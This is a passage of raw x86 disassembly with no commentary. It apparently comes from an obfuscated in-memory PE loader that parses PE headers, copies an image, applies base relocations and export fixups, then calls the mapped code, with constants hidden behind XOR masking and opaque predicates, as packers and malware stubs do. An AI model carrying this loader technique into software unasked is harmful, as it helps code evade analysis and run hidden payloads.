  420edf:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420ee7:	mov    ecx,DWORD PTR [ebp-0xd0]
  420eed:	xor    ecx,ebx
  420eef:	lea    eax,[ecx+eax*1+0x3272fa]
  420ef6:	movzx  ecx,BYTE PTR [ebp-0x1]
  420efa:	xor    ecx,eax
  420efc:	mov    BYTE PTR [ebp-0x1],cl
  420eff:	mov    al,BYTE PTR [ebp-0x1]
  420f02:	mov    ecx,DWORD PTR [ebp-0x8]
  420f05:	mov    edx,DWORD PTR [ebp-0x18]
  420f08:	xor    ecx,ebx
  420f0a:	add    ecx,esi
  420f0c:	imul   ecx,edx
  420f0f:	mov    edx,DWORD PTR [ebp-0x1c]
  420f12:	mov    BYTE PTR [ecx+edx*1],al
  420f15:	mov    eax,DWORD PTR [ebp-0x38]
  420f18:	mov    ecx,DWORD PTR [ebp-0x14]
  420f1b:	xor    eax,ebx
  420f1d:	xor    ecx,ebx
  420f1f:	add    eax,esi
  420f21:	add    ecx,esi
  420f23:	imul   eax,ecx
  420f26:	add    eax,DWORD PTR [ebp-0x18]
  420f29:	mov    DWORD PTR [ebp-0x18],eax
  420f2c:	mov    eax,DWORD PTR [ebp-0x18]
  420f2f:	mov    ecx,DWORD PTR [ebp-0x20]
  420f32:	cmp    ecx,eax
  420f34:	jb     0x420e3b
  420f3a:	mov    eax,DWORD PTR [ebp-0x14]
  420f3d:	mov    ecx,DWORD PTR [ebp-0x20]
  420f40:	xor    eax,ebx
  420f42:	add    eax,esi
  420f44:	imul   eax,ecx
  420f47:	mov    ecx,DWORD PTR [ebp-0x4c]
  420f4a:	xor    ecx,ebx
  420f4c:	add    ecx,esi
  420f4e:	or     eax,ecx
  420f50:	mov    ecx,DWORD PTR [ebp-0x30]
  420f53:	xor    ecx,ebx
  420f55:	add    eax,ecx
  420f57:	mov    ecx,DWORD PTR [ebp-0x30]
  420f5a:	xor    ecx,ebx
  420f5c:	add    eax,ecx
  420f5e:	mov    ecx,DWORD PTR [ebp-0xc]
  420f61:	lea    eax,[eax+ecx*1+0x64e5f4]
  420f68:	jmp    0x420f79
  420f6a:	mov    eax,DWORD PTR [ebp-0x30]
  420f6d:	mov    ecx,DWORD PTR [ebp-0xc]
  420f70:	xor    eax,ebx
  420f72:	lea    eax,[eax+ecx*1+0x3272fa]
  420f79:	mov    DWORD PTR [ebp-0xc],eax
  420f7c:	mov    eax,DWORD PTR [ebp-0x30]
  420f7f:	xor    eax,ebx
  420f81:	mov    ecx,0xffcd8d06
  420f86:	sub    ecx,eax
  420f88:	add    ecx,DWORD PTR [ebp-0x34]
  420f8b:	mov    eax,DWORD PTR [ebp-0x30]
  420f8e:	mov    edx,DWORD PTR [ebp-0xc]
  420f91:	xor    eax,ebx
  420f93:	add    eax,esi
  420f95:	imul   eax,edx
  420f98:	cmp    eax,ecx
  420f9a:	jbe    0x420db5
  420fa0:	push   DWORD PTR [ebp+0x8]
  420fa3:	mov    eax,DWORD PTR [ebp+0x8]
  420fa6:	push   DWORD PTR [eax+0x1cc]
  420fac:	lea    eax,[ebp-0xd8]
  420fb2:	push   eax
  420fb3:	mov    eax,DWORD PTR [ebp+0x8]
  420fb6:	mov    eax,DWORD PTR [eax+0x1c4]
  420fbc:	push   DWORD PTR [eax]
  420fbe:	mov    eax,DWORD PTR [ebp+0x8]
  420fc1:	mov    eax,DWORD PTR [eax+0x1c0]
  420fc7:	push   DWORD PTR [eax]
  420fc9:	push   DWORD PTR [ebp-0x3c]
  420fcc:	push   DWORD PTR [ebp-0x2c]
  420fcf:	call   0x421a66
  420fd4:	mov    DWORD PTR [ebp-0x40],eax
  420fd7:	mov    eax,DWORD PTR [ebp-0x10]
  420fda:	mov    ecx,DWORD PTR [ebp-0x2c]
  420fdd:	xor    eax,ebx
  420fdf:	add    eax,esi
  420fe1:	cmp    eax,ecx
  420fe3:	je     0x421004
  420fe5:	mov    eax,DWORD PTR [ebp+0x8]
  420fe8:	mov    ecx,DWORD PTR [ebp-0x50]
  420feb:	mov    eax,DWORD PTR [eax+0x1e0]
  420ff1:	xor    ecx,ebx
  420ff3:	add    ecx,esi
  420ff5:	push   ecx
  420ff6:	mov    ecx,DWORD PTR [ebp-0x10]
  420ff9:	xor    ecx,ebx
  420ffb:	add    ecx,esi
  420ffd:	push   ecx
  420ffe:	push   DWORD PTR [ebp-0x2c]
  421001:	call   DWORD PTR [eax+0x18]
  421004:	pop    edi
  421005:	pop    esi
  421006:	pop    ebx
  421007:	leave  
  421008:	ret    0x4
  42100b:	push   ebp
  42100c:	mov    ebp,esp
  42100e:	push   ecx
  42100f:	push   ecx
  421010:	lea    eax,[ebp-0x8]
  421013:	mov    DWORD PTR [ebp-0x4],eax
  421016:	push   esi
  421017:	mov    esi,DWORD PTR [ebp-0x4]
  42101a:	mov    eax,0xf881bacf
  42101f:	mov    DWORD PTR [esi],eax
  421021:	mov    esi,DWORD PTR [ebp-0x8]
  421024:	cmp    esi,eax
  421026:	pop    esi
  421027:	jne    0x421031
  421029:	mov    BYTE PTR [ecx+0xa],0x7b
  42102d:	mov    BYTE PTR [edx+0x8],0xcc
  421031:	mov    BYTE PTR [edx+0xa],0x7b
  421035:	mov    BYTE PTR [ecx+0x2],0xe9
  421039:	leave  
  42103a:	ret    
  42103b:	push   ebp
  42103c:	mov    ebp,esp
  42103e:	push   ecx
  42103f:	push   ecx
  421040:	lea    eax,[ebp-0x8]
  421043:	mov    DWORD PTR [ebp-0x4],eax
  421046:	mov    edx,DWORD PTR [ebp-0x4]
  421049:	mov    eax,0xf88b0bd3
  42104e:	mov    DWORD PTR [edx],eax
  421050:	mov    edx,DWORD PTR [ebp-0x8]
  421053:	cmp    edx,eax
  421055:	jne    0x421066
  421057:	mov    eax,DWORD PTR [ebp+0x8]
  42105a:	mov    BYTE PTR [ecx+0x9],0xef
  42105e:	mov    BYTE PTR [eax+0x7],0xa4
  421062:	mov    BYTE PTR [ecx+0x6],0xec
  421066:	mov    BYTE PTR [ecx+0x3],0xdf
  42106a:	leave  
  42106b:	ret    0x4
  42106e:	push   ebp
  42106f:	mov    ebp,esp
  421071:	push   ecx
  421072:	push   ecx
  421073:	lea    eax,[ebp-0x8]
  421076:	mov    DWORD PTR [ebp-0x4],eax
  421079:	mov    edx,DWORD PTR [ebp-0x4]
  42107c:	mov    eax,0x7e0dacf
  421081:	mov    DWORD PTR [edx],eax
  421083:	mov    edx,DWORD PTR [ebp-0x8]
  421086:	cmp    edx,eax
  421088:	jne    0x42108e
  42108a:	mov    BYTE PTR [ecx+0x7],0xa4
  42108e:	mov    eax,DWORD PTR [ebp+0x8]
  421091:	mov    BYTE PTR [ecx+0x1],0xe2
  421095:	mov    BYTE PTR [eax+0x9],0xcf
  421099:	leave  
  42109a:	ret    0x4
  42109d:	push   ebp
  42109e:	mov    ebp,esp
  4210a0:	push   ecx
  4210a1:	push   ecx
  4210a2:	lea    eax,[ebp-0x8]
  4210a5:	mov    DWORD PTR [ebp-0x4],eax
  4210a8:	push   esi
  4210a9:	mov    esi,DWORD PTR [ebp-0x4]
  4210ac:	mov    eax,0x7060e3e
  4210b1:	mov    DWORD PTR [esi],eax
  4210b3:	mov    esi,DWORD PTR [ebp-0x8]
  4210b6:	cmp    esi,eax
  4210b8:	pop    esi
  4210b9:	jne    0x4210c5
  4210bb:	mov    BYTE PTR [edx+0x4],0xe8
  4210bf:	mov    WORD PTR [ecx+0x3],0xe8df
  4210c5:	mov    BYTE PTR [edx],0xbc
  4210c8:	leave  
  4210c9:	ret    
  4210ca:	push   ebp
  4210cb:	mov    ebp,esp
  4210cd:	push   ecx
  4210ce:	push   ecx
  4210cf:	lea    eax,[ebp-0x8]
  4210d2:	mov    DWORD PTR [ebp-0x4],eax
  4210d5:	mov    edx,DWORD PTR [ebp-0x4]
  4210d8:	mov    eax,0xf8870b3f
  4210dd:	mov    DWORD PTR [edx],eax
  4210df:	mov    edx,DWORD PTR [ebp-0x8]
  4210e2:	cmp    edx,eax
  4210e4:	jne    0x4210f1
  4210e6:	mov    eax,DWORD PTR [ebp+0x8]
  4210e9:	mov    BYTE PTR [ecx+0x8],0xec
  4210ed:	mov    BYTE PTR [eax+0x1],0xe2
  4210f1:	mov    BYTE PTR [ecx+0x5],0xf0
  4210f5:	leave  
  4210f6:	ret    0x4
  4210f9:	push   esi
  4210fa:	mov    ecx,edi
  4210fc:	call   0x4210ca
  421101:	mov    edx,edi
  421103:	mov    ecx,esi
  421105:	mov    BYTE PTR [esi],0xdc
  421108:	call   0x42109d
  42110d:	push   esi
  42110e:	mov    ecx,edi
  421110:	mov    BYTE PTR [esi+0x5],0xf0
  421114:	call   0x42106e
  421119:	push   esi
  42111a:	mov    BYTE PTR [esi+0x6],0xec
  42111e:	call   0x42103b
  421123:	mov    BYTE PTR [esi+0x2],0xe9
  421127:	mov    edx,esi
  421129:	jmp    0x42100b
  42112e:	push   ebp
  42112f:	mov    ebp,esp
  421131:	push   ecx
  421132:	mov    ecx,DWORD PTR [edx+0x194]
  421138:	push   esi
  421139:	mov    esi,DWORD PTR [ebp+0x8]
  42113c:	mov    esi,DWORD PTR [esi]
  42113e:	mov    DWORD PTR [ecx],esi
  421140:	mov    ecx,DWORD PTR [edx+0x194]
  421146:	mov    ecx,DWORD PTR [ecx]
  421148:	mov    esi,DWORD PTR [edx+0x190]
  42114e:	mov    DWORD PTR [esi],ecx
  421150:	mov    eax,DWORD PTR [edx+0x194]
  421156:	mov    ecx,DWORD PTR [eax]
  421158:	mov    ecx,DWORD PTR [ecx+0x3c]
  42115b:	add    ecx,DWORD PTR [eax]
  42115d:	mov    DWORD PTR [ebp-0x4],0xf89ca5b5
  421164:	mov    eax,DWORD PTR [ebp-0x4]
  421167:	movzx  ecx,WORD PTR [ecx+0x16]
  42116b:	xor    eax,0x75108b3
  421170:	add    eax,0x3272fa
  421175:	pop    esi
  421176:	test   ecx,eax
  421178:	je     0x421186
  42117a:	mov    eax,DWORD PTR [edx+0x1c8]
  421180:	mov    DWORD PTR [eax],0xf89c85b4
  421186:	leave  
  421187:	ret    0x4
  42118a:	push   ebp
  42118b:	mov    ebp,esp
  42118d:	sub    esp,0x70
  421190:	and    DWORD PTR [ebp-0x20],0x0
  421194:	mov    DWORD PTR [ebp-0x18],0xf89cb5b5
  42119b:	mov    DWORD PTR [ebp-0x1c],0xf89c85f5
  4211a2:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  4211a9:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  4211b0:	mov    DWORD PTR [ebp-0x2c],0xf89f05b5
  4211b7:	mov    eax,DWORD PTR [ebp+0x20]
  4211ba:	mov    eax,DWORD PTR [eax+0x194]
  4211c0:	mov    DWORD PTR [ebp-0xc],eax
  4211c3:	mov    eax,DWORD PTR [ebp+0x20]
  4211c6:	push   ebx
  4211c7:	push   esi
  4211c8:	mov    esi,DWORD PTR [eax+0x190]
  4211ce:	mov    eax,DWORD PTR [ebp+0x20]
  4211d1:	mov    eax,DWORD PTR [eax+0x18c]
  4211d7:	mov    DWORD PTR [ebp-0x8],eax
  4211da:	mov    eax,DWORD PTR [eax]
  4211dc:	push   edi
  4211dd:	mov    DWORD PTR [ebp-0x4],esi
  4211e0:	test   eax,eax
  4211e2:	jne    0x4211ef
  4211e4:	push   DWORD PTR [ebp+0x1c]
  4211e7:	mov    edx,DWORD PTR [ebp+0x20]
  4211ea:	call   0x42112e
  4211ef:	mov    eax,DWORD PTR [esi]
  4211f1:	mov    ebx,DWORD PTR [esi]
  4211f3:	add    ebx,DWORD PTR [eax+0x3c]
  4211f6:	mov    eax,DWORD PTR [ebp+0xc]
  4211f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4211fc:	mov    ecx,DWORD PTR [ecx]
  4211fe:	mov    esi,0x75108b3
  421203:	xor    eax,esi
  421205:	mov    edi,0x3272fa
  42120a:	add    eax,edi
  42120c:	cmp    eax,ecx
  42120e:	jne    0x421446
  421214:	mov    eax,DWORD PTR [ebp-0xc]
  421217:	mov    eax,DWORD PTR [eax]
  421219:	mov    DWORD PTR [ebp-0x10],eax
  42121c:	mov    eax,DWORD PTR [ebx+0x50]
  42121f:	mov    DWORD PTR [ebp-0x68],eax
  421222:	mov    eax,DWORD PTR [ebp-0x18]
  421225:	xor    eax,esi
  421227:	add    eax,edi
  421229:	mov    DWORD PTR [ebp-0x64],eax
  42122c:	mov    eax,DWORD PTR [ebp-0x14]
  42122f:	and    DWORD PTR [ebp-0x6c],0x0
  421233:	xor    eax,esi
  421235:	add    eax,edi
  421237:	mov    DWORD PTR [ebp-0x60],eax
  42123a:	lea    eax,[ebp-0x70]
  42123d:	push   eax
  42123e:	mov    eax,DWORD PTR [ebp+0x8]
  421241:	xor    eax,esi
  421243:	add    eax,edi
  421245:	push   eax
  421246:	mov    eax,DWORD PTR [ebp+0x20]
  421249:	add    eax,0xaa
  42124e:	push   eax
  42124f:	mov    eax,DWORD PTR [ebp+0x20]
  421252:	mov    eax,DWORD PTR [eax+0x198]
  421258:	mov    DWORD PTR [ebp-0x70],0x4
  42125f:	push   DWORD PTR [eax]
  421261:	mov    eax,DWORD PTR [ebp+0x10]
  421264:	call   eax
  421266:	mov    ecx,DWORD PTR [ebp-0xc]
  421269:	mov    ecx,DWORD PTR [ecx]
  42126b:	mov    edx,DWORD PTR [ebp-0x8]
  42126e:	mov    DWORD PTR [ebp-0x6c],eax
  421271:	mov    DWORD PTR [ebp+0x1c],eax
  421274:	mov    DWORD PTR [edx],ecx
  421276:	mov    ecx,DWORD PTR [ebp-0x4]
  421279:	mov    DWORD PTR [ecx],eax
  42127b:	mov    eax,DWORD PTR [ebx+0x50]
  42127e:	mov    DWORD PTR [ebp-0x68],eax
  421281:	mov    eax,DWORD PTR [ebp-0x1c]
  421284:	xor    eax,esi
  421286:	add    eax,edi
  421288:	mov    DWORD PTR [ebp-0x64],eax
  42128b:	lea    eax,[ebp-0x20]
  42128e:	mov    DWORD PTR [ebp-0x60],eax
  421291:	lea    eax,[ebp-0x70]
  421294:	push   eax
  421295:	mov    eax,DWORD PTR [ebp+0x8]
  421298:	xor    eax,esi
  42129a:	add    eax,edi
  42129c:	push   eax
  42129d:	mov    eax,DWORD PTR [ebp+0x20]
  4212a0:	add    eax,0xee
  4212a5:	push   eax
  4212a6:	mov    eax,DWORD PTR [ebp+0x20]
  4212a9:	mov    eax,DWORD PTR [eax+0x198]
  4212af:	mov    DWORD PTR [ebp-0x70],0x4
  4212b6:	push   DWORD PTR [eax]
  4212b8:	mov    eax,DWORD PTR [ebp+0x10]
  4212bb:	call   eax
  4212bd:	test   eax,eax
  4212bf:	je     0x4212e4
  4212c1:	and    DWORD PTR [ebp+0xc],0x0
  4212c5:	cmp    DWORD PTR [ebx+0x50],0x0
  4212c9:	jbe    0x4212e4
  4212cb:	mov    eax,DWORD PTR [ebp+0x1c]
  4212ce:	mov    ecx,DWORD PTR [ebp-0x10]
  4212d1:	sub    ecx,eax
  4212d3:	mov    dl,BYTE PTR [ecx+eax*1]
  4212d6:	inc    DWORD PTR [ebp+0xc]
  4212d9:	mov    BYTE PTR [eax],dl
  4212db:	mov    edx,DWORD PTR [ebp+0xc]
  4212de:	inc    eax
  4212df:	cmp    edx,DWORD PTR [ebx+0x50]
  4212e2:	jb     0x4212d3
  4212e4:	mov    edx,DWORD PTR [ebp+0x1c]
  4212e7:	mov    ecx,DWORD PTR [edx+0x3c]
  4212ea:	add    ecx,edx
  4212ec:	mov    eax,DWORD PTR [ecx+0xa0]
  4212f2:	mov    ebx,DWORD PTR [ecx+0x28]
  4212f5:	add    eax,edx
  4212f7:	sub    edx,DWORD PTR [ebp-0x10]
  4212fa:	add    ebx,DWORD PTR [ebp+0x1c]
  4212fd:	mov    DWORD PTR [ebp+0xc],edx
  421300:	mov    DWORD PTR [ebp-0x2c],ecx
  421303:	mov    DWORD PTR [ebp-0x14],ebx
  421306:	mov    DWORD PTR [ebp-0x8],0x0
  42130d:	jmp    0x421389
  42130f:	add    edx,0xfffffff8
  421312:	shr    edx,1
  421314:	mov    DWORD PTR [ebp-0x18],edx
  421317:	je     0x421375
  421319:	lea    edx,[eax+0x8]
  42131c:	mov    DWORD PTR [ebp-0x4],edx
  42131f:	mov    edx,DWORD PTR [ebp-0x18]
  421322:	mov    DWORD PTR [ebp-0x18],edx
  421325:	mov    edx,DWORD PTR [ebp-0x4]
  421328:	movzx  edx,WORD PTR [edx]
  42132b:	mov    DWORD PTR [ebp-0x24],edx
  42132e:	and    edx,0xfff
  421334:	mov    DWORD PTR [ebp-0x28],edx
  421337:	mov    edx,DWORD PTR [ebp-0x24]
  42133a:	shr    edx,0xc
  42133d:	add    edx,0xffcd8d06
  421343:	xor    edx,esi
  421345:	cmp    edx,0xf89c85ba
  42134b:	jne    0x42136c
  42134d:	mov    edx,DWORD PTR [ebp-0x28]
  421350:	add    edx,DWORD PTR [ebp+0x1c]
  421353:	mov    ebx,DWORD PTR [eax]
  421355:	cmp    DWORD PTR [ebx+edx*1],0x0
  421359:	je     0x421369
  42135b:	mov    ecx,DWORD PTR [ebp+0xc]
  42135e:	add    ecx,DWORD PTR [ebx+edx*1]
  421361:	mov    ebx,DWORD PTR [eax]
  421363:	mov    DWORD PTR [edx+ebx*1],ecx
  421366:	mov    ecx,DWORD PTR [ebp-0x2c]
  421369:	mov    ebx,DWORD PTR [ebp-0x14]
  42136c:	add    DWORD PTR [ebp-0x4],0x2
  421370:	dec    DWORD PTR [ebp-0x18]
  421373:	jne    0x421325
  421375:	mov    edx,DWORD PTR [ebp-0xc]
  421378:	add    DWORD PTR [ebp-0x8],edx
  42137b:	mov    edx,DWORD PTR [ebp-0x8]
  42137e:	cmp    edx,DWORD PTR [ecx+0xa4]
  421384:	jae    0x421397
  421386:	add    eax,DWORD PTR [ebp-0xc]
  421389:	mov    edx,DWORD PTR [eax+0x4]
  42138c:	mov    DWORD PTR [ebp-0xc],edx
  42138f:	test   edx,edx
  421391:	jne    0x42130f
  421397:	mov    eax,DWORD PTR [ebp-0x10]
  42139a:	mov    DWORD PTR [ebp-0x6c],eax
  42139d:	mov    DWORD PTR [ebp-0x70],0x4
  4213a4:	mov    eax,DWORD PTR [ecx+0x50]
  4213a7:	mov    DWORD PTR [ebp-0x68],eax
  4213aa:	mov    eax,DWORD PTR [ebp-0x1c]
  4213ad:	xor    eax,esi
  4213af:	add    eax,edi
  4213b1:	mov    DWORD PTR [ebp-0x64],eax
  4213b4:	lea    eax,[ebp-0x20]
  4213b7:	mov    DWORD PTR [ebp-0x60],eax
  4213ba:	lea    eax,[ebp-0x70]
  4213bd:	push   eax
  4213be:	mov    eax,DWORD PTR [ebp+0x8]
  4213c1:	xor    eax,esi
  4213c3:	add    eax,edi
  4213c5:	push   eax
  4213c6:	mov    eax,DWORD PTR [ebp+0x20]
  4213c9:	add    eax,0xee
  4213ce:	push   eax
  4213cf:	mov    eax,DWORD PTR [ebp+0x20]
  4213d2:	mov    eax,DWORD PTR [eax+0x198]
  4213d8:	push   DWORD PTR [eax]
  4213da:	mov    eax,DWORD PTR [ebp+0x10]
  4213dd:	call   eax
  4213df:	mov    eax,DWORD PTR [ebp+0x20]
  4213e2:	mov    eax,DWORD PTR [eax+0x180]
  4213e8:	add    eax,DWORD PTR [ebp+0xc]
  4213eb:	mov    ecx,DWORD PTR [ebp+0xc]
  4213ee:	push   DWORD PTR [ebp+0x18]
  4213f1:	mov    DWORD PTR [eax],ecx
  4213f3:	push   DWORD PTR [ebp+0x14]
  4213f6:	push   DWORD PTR [ebp+0x1c]
  4213f9:	call   ebx
  4213fb:	mov    ecx,DWORD PTR [ebp+0xc]
  4213fe:	add    ecx,DWORD PTR [ebp+0x20]
  421401:	lea    eax,[ebp+0x4]
  421404:	mov    DWORD PTR [ebp+0x20],ecx
  421407:	mov    ecx,DWORD PTR [ebp+0x20]
  42140a:	mov    ecx,DWORD PTR [ebp+0x20]
  42140d:	mov    edx,DWORD PTR [ecx+0x190]
  421413:	mov    ecx,DWORD PTR [ebp+0x20]
  421416:	mov    ecx,DWORD PTR [ecx+0x18c]
  42141c:	mov    esi,DWORD PTR [ecx]
  42141e:	cmp    DWORD PTR [eax],esi
  421420:	jb     0x421441
  421422:	mov    esi,DWORD PTR [edx]
  421424:	mov    edi,DWORD PTR [edx]
  421426:	mov    esi,DWORD PTR [esi+0x3c]
  421429:	lea    esi,[edi+esi*1+0x50]
  42142d:	mov    edi,DWORD PTR [ecx]
  42142f:	add    edi,DWORD PTR [esi]
  421431:	cmp    DWORD PTR [eax],edi
  421433:	jae    0x421441
  421435:	mov    esi,DWORD PTR [ecx]
  421437:	mov    ecx,DWORD PTR [eax]
  421439:	mov    edx,DWORD PTR [edx]
  42143b:	sub    ecx,esi
  42143d:	add    edx,ecx
  42143f:	mov    DWORD PTR [eax],edx
  421441:	mov    eax,DWORD PTR [ebp+0xc]
  421444:	jmp    0x421448
  421446:	xor    eax,eax
  421448:	pop    edi
  421449:	pop    esi
  42144a:	pop    ebx
  42144b:	leave  
  42144c:	ret    0x1c
  42144f:	push   ebp
  421450:	mov    ebp,esp
  421452:	sub    esp,0x1c
  421455:	push   esi
  421456:	mov    esi,eax
  421458:	mov    eax,DWORD PTR [ecx+0x190]
  42145e:	cmp    DWORD PTR [eax],0x0
  421461:	je     0x421571
  421467:	test   edx,edx
  421469:	je     0x421571
  42146f:	test   esi,esi
  421471:	je     0x421571
  421477:	mov    eax,DWORD PTR [esi+0x88]
  42147d:	test   eax,eax
  42147f:	je     0x42156c
  421485:	cmp    DWORD PTR [esi+0x8c],0x10
  42148c:	je     0x42156c
  421492:	cmp    DWORD PTR [esi+0x34],edx
  421495:	je     0x42156c
  42149b:	mov    esi,DWORD PTR [ecx+0x18c]
  4214a1:	and    DWORD PTR [ebp-0x10],0x0
  4214a5:	mov    ecx,edx
  4214a7:	sub    ecx,DWORD PTR [esi]
  4214a9:	add    eax,edx
  4214ab:	movzx  edx,WORD PTR [eax+0xc]
  4214af:	mov    DWORD PTR [ebp-0x1c],ecx
  4214b2:	movzx  ecx,WORD PTR [eax+0xe]
  4214b6:	add    ecx,edx
  4214b8:	je     0x42156c
  4214be:	lea    ecx,[eax+0x14]
  4214c1:	push   ebx
  4214c2:	mov    DWORD PTR [ebp-0x18],ecx
  4214c5:	mov    esi,0x7fffffff
  4214ca:	push   edi
  4214cb:	test   DWORD PTR [ecx],esi
  4214cd:	je     0x42154e
  4214cf:	mov    edx,DWORD PTR [ecx]
  4214d1:	and    DWORD PTR [ebp-0xc],0x0
  4214d5:	and    edx,esi
  4214d7:	add    edx,eax
  4214d9:	movzx  edi,WORD PTR [edx+0xe]
  4214dd:	movzx  ebx,WORD PTR [edx+0xc]
  4214e1:	add    edi,ebx
  4214e3:	je     0x42154e
  4214e5:	lea    ecx,[edx+0x14]
  4214e8:	mov    DWORD PTR [ebp-0x14],ecx
  4214eb:	test   DWORD PTR [ecx],esi
  4214ed:	je     0x421530
  4214ef:	mov    ecx,DWORD PTR [ecx]
  4214f1:	and    DWORD PTR [ebp-0x8],0x0
  4214f5:	and    ecx,esi
  4214f7:	add    ecx,eax
  4214f9:	movzx  edi,WORD PTR [ecx+0xe]
  4214fd:	movzx  ebx,WORD PTR [ecx+0xc]
  421501:	add    edi,ebx
  421503:	je     0x421530
  421505:	lea    edi,[ecx+0x14]
  421508:	mov    DWORD PTR [ebp-0x4],edi
  42150b:	mov    edi,DWORD PTR [ebp-0x4]
  42150e:	mov    edi,DWORD PTR [edi]
  421510:	test   edi,edi
  421512:	je     0x42151a
  421514:	mov    ebx,DWORD PTR [ebp-0x1c]
  421517:	add    DWORD PTR [edi+eax*1],ebx
  42151a:	movzx  edi,WORD PTR [ecx+0xe]
  42151e:	movzx  ebx,WORD PTR [ecx+0xc]
  421522:	inc    DWORD PTR [ebp-0x8]
  421525:	add    DWORD PTR [ebp-0x4],0x8
  421529:	add    edi,ebx
  42152b:	cmp    DWORD PTR [ebp-0x8],edi
  42152e:	jb     0x42150b
  421530:	movzx  edi,WORD PTR [edx+0xe]
  421534:	movzx  ebx,WORD PTR [edx+0xc]
  421538:	mov    ecx,DWORD PTR [ebp-0x14]
  42153b:	inc    DWORD PTR [ebp-0xc]
  42153e:	add    ecx,0x8
  421541:	add    edi,ebx
  421543:	mov    DWORD PTR [ebp-0x14],ecx
  421546:	cmp    DWORD PTR [ebp-0xc],edi
  421549:	jb     0x4214eb
  42154b:	mov    ecx,DWORD PTR [ebp-0x18]
  42154e:	movzx  edx,WORD PTR [eax+0xe]
  421552:	movzx  edi,WORD PTR [eax+0xc]
  421556:	inc    DWORD PTR [ebp-0x10]
  421559:	add    ecx,0x8
  42155c:	add    edx,edi
  42155e:	mov    DWORD PTR [ebp-0x18],ecx
  421561:	cmp    DWORD PTR [ebp-0x10],edx
  421564:	jb     0x4214cb
  42156a:	pop    edi
  42156b:	pop    ebx
  42156c:	xor    eax,eax
  42156e:	inc    eax
  42156f:	jmp    0x421573
  421571:	xor    eax,eax
  421573:	pop    esi
  421574:	leave  
  421575:	ret    
  421576:	push   ebp
  421577:	mov    ebp,esp
  421579:	mov    ecx,DWORD PTR [ecx+0x190]
  42157f:	mov    eax,DWORD PTR [ebp+0xc]
  421582:	sub    esp,0x10
  421585:	push   ebx
  421586:	xor    ebx,ebx
  421588:	push   esi
  421589:	push   edi
  42158a:	cmp    DWORD PTR [ecx],ebx
  42158c:	je     0x421614
  421592:	cmp    eax,ebx
  421594:	je     0x421614
  421596:	cmp    DWORD PTR [eax+0x78],ebx
  421599:	jne    0x4215a0
  42159b:	xor    eax,eax
  42159d:	inc    eax
  42159e:	jmp    0x421616
  4215a0:	mov    eax,DWORD PTR [eax+0x78]
  4215a3:	add    eax,DWORD PTR [ebp+0x8]
  4215a6:	mov    ecx,DWORD PTR [eax+0x1c]
  4215a9:	mov    edx,DWORD PTR [eax+0x24]
  4215ac:	mov    esi,DWORD PTR [eax+0x14]
  4215af:	mov    edi,DWORD PTR [eax+0x18]
  4215b2:	add    ecx,DWORD PTR [ebp+0x8]
  4215b5:	add    edx,DWORD PTR [ebp+0x8]
  4215b8:	mov    DWORD PTR [ebp-0x4],esi
  4215bb:	cmp    esi,edi
  4215bd:	ja     0x4215c2
  4215bf:	mov    DWORD PTR [ebp-0x4],edi
  4215c2:	mov    DWORD PTR [ebp-0x8],ebx
  4215c5:	cmp    DWORD PTR [ebp-0x4],ebx
  4215c8:	jbe    0x42159b
  4215ca:	cmp    ebx,DWORD PTR [eax+0x14]
  4215cd:	jae    0x4215d5
  4215cf:	movzx  esi,WORD PTR [edx+ebx*2]
  4215d3:	jmp    0x4215d7
  4215d5:	mov    esi,ebx
  4215d7:	lea    esi,[ecx+esi*4]
  4215da:	mov    edi,DWORD PTR [esi]
  4215dc:	test   edi,edi
  4215de:	je     0x421609
  4215e0:	add    edi,DWORD PTR [ebp+0x8]
  4215e3:	mov    DWORD PTR [ebp-0x10],edi
  4215e6:	cmp    edi,eax
  4215e8:	jbe    0x4215fa
  4215ea:	mov    ebx,DWORD PTR [ebp+0xc]
  4215ed:	mov    ebx,DWORD PTR [ebx+0x7c]
  4215f0:	add    ebx,eax
  4215f2:	cmp    edi,ebx
  4215f4:	jae    0x4215fa
  4215f6:	mov    esi,DWORD PTR [esi]
  4215f8:	jmp    0x421602
  4215fa:	sub    edi,DWORD PTR [ebp+0x8]
  4215fd:	mov    DWORD PTR [esi],edi
  4215ff:	mov    esi,DWORD PTR [ebp-0x10]
  421602:	test   esi,esi
  421604:	je     0x421614
  421606:	mov    ebx,DWORD PTR [ebp-0x8]
  421609:	inc    ebx
  42160a:	mov    DWORD PTR [ebp-0x8],ebx
  42160d:	cmp    ebx,DWORD PTR [ebp-0x4]
  421610:	jb     0x4215ca
  421612:	jmp    0x42159b
  421614:	xor    eax,eax
  421616:	pop    edi
  421617:	pop    esi
  421618:	pop    ebx
  421619:	leave  
  42161a:	ret    0x8
  42161d:	push   ebp
  42161e:	mov    ebp,esp
  421620:	sub    esp,0x2c
  421623:	mov    edx,0xf89c85b5
  421628:	mov    DWORD PTR [ebp-0x4],edx
  42162b:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  421632:	mov    eax,DWORD PTR [ebp-0x4]
  421635:	mov    ecx,DWORD PTR [ebp-0x4]
  421638:	mov    ecx,DWORD PTR [ebp-0x4]
  42163b:	mov    ecx,DWORD PTR [ebp-0x4]
  42163e:	mov    ecx,DWORD PTR [ebp-0x4]
  421641:	mov    ecx,DWORD PTR [ebp-0x4]
  421644:	push   ebx
  421645:	mov    ebx,DWORD PTR [ebp+0x10]
  421648:	push   esi
  421649:	mov    esi,0x75108b3
  42164e:	mov    DWORD PTR [ebp-0x10],0x352ebcf
  421655:	mov    ecx,DWORD PTR [ebp-0x4]
  421658:	mov    ebx,DWORD PTR [ebx+0x190]
  42165e:	push   edi
  42165f:	mov    edi,0x3272fa
  421664:	xor    ecx,esi
  421666:	xor    eax,esi
  421668:	add    eax,edi
  42166a:	add    ecx,edi
  42166c:	mov    DWORD PTR [ebp-0x18],eax
  42166f:	cmp    ecx,DWORD PTR [ebx]
  421671:	je     0x4218f2
  421677:	mov    ebx,DWORD PTR [ebp-0x4]
  42167a:	mov    ecx,DWORD PTR [ebp+0xc]
  42167d:	xor    ebx,esi
  42167f:	add    ebx,edi
  421681:	cmp    ebx,ecx
  421683:	je     0x4218f2
  421689:	mov    ebx,DWORD PTR [ebp-0x4]
  42168c:	mov    ecx,DWORD PTR [ecx+0x80]
  421692:	xor    ebx,esi
  421694:	add    ebx,edi
  421696:	cmp    ecx,ebx
  421698:	je     0x4218ed
  42169e:	add    ecx,DWORD PTR [ebp+0x8]
